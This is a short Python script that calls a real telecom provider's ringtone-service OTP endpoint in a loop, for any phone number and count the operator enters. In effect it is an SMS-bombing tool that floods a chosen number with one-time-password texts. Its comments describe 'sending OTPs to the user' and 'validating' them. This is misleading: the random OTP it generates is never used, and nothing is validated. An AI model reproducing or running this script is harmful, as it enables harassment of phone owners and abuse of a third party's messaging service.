import requests
import random

# Get the phone number from the user
phone_number = input("Enter your phone number in the format +94xxxxxxxx: ")

# Get the number of OTPs to send from the user
num_otps = int(input("Enter the number of OTPs to send: "))

# Send the OTPs to the user
url = "https://ringintones.dialog.lk/prbt/generateotp"
for i in range(num_otps):
    # Generate a random OTP
    otp = random.randint(1000, 9999)

    # Send the OTP to the user
    payload = {"msisdn": phone_number, "type": None}
    response = requests.post(url, json=payload)

    # Validate the OTP
    if response.status_code == 200:
        print(f"OTP {i+1} sent successfully to {phone_number}")
    else:
        print(f"Failed to send OTP {i+1}")